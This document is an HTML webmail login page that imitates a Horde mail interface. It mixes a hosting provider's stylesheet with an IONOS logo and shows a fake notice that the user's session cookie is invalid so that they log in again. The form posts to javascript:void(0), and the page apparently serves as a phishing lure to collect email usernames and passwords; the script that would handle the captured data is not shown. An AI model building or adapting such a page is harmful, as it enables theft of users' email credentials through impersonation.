<head>
    <link href="https://webmail.your-server.de/services/cache.php?cache=css%2Fcid%3Dfdbc7b51634d9bb8" rel="stylesheet" type="text/css">
    <link type="image/x-icon" href="/themes/konsoleh/graphics/favicon.ico" rel="shortcut icon" id="favicon" />
    <title id="tittle">unwrapped - Mail</title>
</head>

<body class="modal-form">
<style type="text/css">
    body { margin: 0; padding: 0; }
    body.modal-form { background-color: #f2f2f2; font-size:14px; font-family: Arial, sans-serif; }
    div.modal-form { font-size:1.1em;background-color: #ffffff;border: 1px solid #cccccc;border-radius:0.5em;width:60%;min-width:1000px;margin:4em auto 0 auto;padding:4em 0 4em 0;box-shadow:none;}
    #horde_login { background-color:#ffffff; border: 1px solid #cccccc;border-radius:10px; width:60%;min-width:450px;margin:2em auto;padding:3em; }
    #horde_login label { box-sizing: border-box;width:25%;float:left;text-align:right;color:#333333;line-height:1.6em;padding-right: 5px;font-weight:normal;}
    #horde_login select, #horde_login input[type="text"], #horde_login input[type="password"] {box-sizing:content-box;width:70%;line-height:1.5em;height:auto;background-color: #ffffff;border-radius:3px;border:1px solid #a1a1a1;padding: 0 0.2em; }
    #horde_login #login-button { background-color:#purple;margin-left:25%;width:70%;color:#FFFFFF;border:0;border-radius:3px;padding:0.4em 1.6em;line-height:1.13em; background-image:none; cursor: pointer; }
    #horde_login #login-button:hover { background-color:purple; transition: all .2s; }
    #horde_login #login-button:disabled { background-color:purple; cursor: not-allowed; }

    table {display:none;}
    ul.notices { margin:10px 20px;padding:10px;border:1px solid #67f; background:#eef5ff; }
    ul.notices li { border:none !important; background-color:transparent;}
    #horde-login-pass-capslock {margin-left:25%;}
    #khlogo {margin-top:-66px; margin-bottom: 66px; width:130px;background-color:#fff;}
    
    #login-status { 
        display: block; 
        margin-bottom: 12px; 
        padding: 5px; 
        border: 1px solid #ffcccc; 
        background-color: #FFFACD; 
        border-radius: 1px;
        color: yellow;
    }
    #login-status.hidden { 
        display: none !important;
    }
    #login-status.final-attempt { 
        border-color: green; 
        background-color: green; 
    }
    #login-status .content-wrapper { display: flex; align-items: center; }
    #login-status-icon-container { margin-right: 10px; }
    .login-status-icon { color: black; font-weight: bold; }
    
    .logo-container { text-align: center; margin-bottom: 20px; }
    #logoimg { max-width: 200px; height: auto; }
    #logoname { font-size: 24px; font-weight: bold; margin-top: 10px; }
    #footer-text { text-align: center; margin-top: 20px; font-size: 12px; color: #666; }
</style>

<div class="modal-form">
    <div class="logo-container">
        <img id="logoimg" src="https://logo.clearbit.com/login.ionos.co.uk" alt="Interactive Element">
        <div id="logoname"></div><div>Hi, ðŸ‘‹<br> AND
Welcome <br></div>
    </div>
  
    <form name="horde_login" id="horde_login" method="post" action="javascript:void(0);">
        <input type="hidden" name="app" id="app" value="">
        <input type="hidden" name="login_post" id="login_post" value="0">
        <input type="hidden" name="url" value="">
        <input type="hidden" name="anchor_string" id="anchor_string" value="">
        
        <div id="login-status" class="error-notice hidden">
            <div class="content-wrapper">
                <div id="login-detail">
                    <div id="login-status-icon-container"><span class="login-status-icon"> <div id="login-status-message">âš  Your session cookie is invalid. Please log in again.</span></div>
                   </div>
                </div>
            </div>
        </div>

        <div><label for="horde_user">Username</label></div>
        <div>
            <input type="text" autocapitalize="none" autocorrect="off" id="horde_user" name="horde_user" value="" style="direction:ltr" placeholder="E-Mailadresse (z.B. Username)">
        </div>
        
        <div><label for="horde_pass">Password</label></div>
        <div>
            <input type="password" id="horde_pass" name="horde_pass" value="" style="direction:ltr" placeholder="Login with Password">
        </div>
        
        <div id="horde-login-pass-capslock" style="display:none">
            Warning: Your Caps Lock key is on!
        </div>
        
        <div id="horde_select_view_div" style="">
            <div><label for="horde_select_view">Mode</label></div>
            <div>
                <select id="horde_select_view" name="horde_select_view">
                    <option value="auto">Automatic</option>
                    <option value="" disabled="disabled">- - - - - - - - - -</option>
                    <option value="basic">Basic</option>
                    <option value="dynamic">Dynamic</option>
                    <option value="smartmobile">Mobile (Smartphone/Tablet)</option>
                    <option value="mobile">Mobile (Minimal)</option>
                    
                </select>
            </div>
        </div>
        
        <input id="login-button" name="login_button" class="horde-default submit-button" value="Log in" type="submit">
    </form>
    
   <div id="footer-text">Connected to your email account</div>
</div>
